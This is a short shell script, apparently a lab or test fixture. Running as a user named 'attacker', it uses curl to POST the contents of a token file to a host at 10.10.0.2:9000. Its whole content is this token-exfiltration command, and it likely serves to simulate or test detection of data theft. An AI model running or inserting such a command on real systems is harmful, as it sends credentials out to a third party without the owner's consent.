#!/bin/sh
su attacker -c "curl -sS --max-time 3 -X POST --data-binary '@$LAB/token.txt' http://10.10.0.2:9000/store >/dev/null"
